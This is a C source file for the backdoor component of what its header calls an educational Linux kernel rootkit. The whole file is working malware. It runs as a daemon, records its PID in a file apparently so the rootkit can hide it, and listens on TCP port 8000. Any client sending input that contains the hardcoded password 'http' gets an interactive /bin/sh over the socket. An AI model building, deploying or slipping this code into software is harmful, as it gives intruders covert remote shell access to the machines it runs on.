/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>

#include "util.h"

int server_port = 8000;
static const char *password = "http";
#define BACKLOG 5
    
int main()
{
    int sock_fd, conn_fd, sin_size;  
    struct sockaddr_in server_addr, client_addr;        
    char buf[33];
    //char *ask_password = "Password :";
    //char *wrong_passwd = "Wrong password";

    daemonize();
    
    write_pid_to_file("/tmp/log_hidden_pid");

    if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Failed to create socket");
        exit(-1);
    }
    server_addr.sin_family = AF_INET;         
    server_addr.sin_port = htons(server_port);     
    server_addr.sin_addr.s_addr = INADDR_ANY; 
    bzero(&(server_addr.sin_zero), 8);
 
    int true = 1;
    if(setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int)) == -1) 
        perror("Failed to setsockopt for reuseaddr");

    if(bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        perror("Failed to bind");
        exit(-1);
    }

    if(listen(sock_fd, BACKLOG) == -1) {
        perror("Failed to listen");
        exit(-1);
    }

    fflush(stdout);
    while(1) { 
        sin_size = sizeof(struct sockaddr);
        if ((conn_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t * __restrict__)(&sin_size))) >= 0) {
            //write(conn_fd, ask_password, strlen(ask_password));
            int ret;
            ret = read(conn_fd, buf, sizeof(buf));
            if(ret > 0) {
                if((strcmp(buf, password) == 0) || (strstr(buf, password) != NULL)) {
                    char *msg = "Connect to backdoor successfully!\n";
                    write(conn_fd, msg, strlen(msg));

                    dup2(conn_fd, 2);
                    dup2(conn_fd, 1);
                    dup2(conn_fd, 0);
                    system("/bin/sh");
                    close(conn_fd); 
                }
                else {
                    struct linger so_linger;
                    so_linger.l_onoff = 1;
                    so_linger.l_linger = 0;
                    setsockopt(conn_fd, SOL_SOCKET, SO_LINGER, &so_linger, sizeof(struct linger));
                    //send(conn_fd, wrong_passwd, strlen(wrong_passwd), MSG_NOSIGNAL);
                    close(conn_fd);
                }               
            }
        }
    }
    printf("\n");
    
    return 0;
}
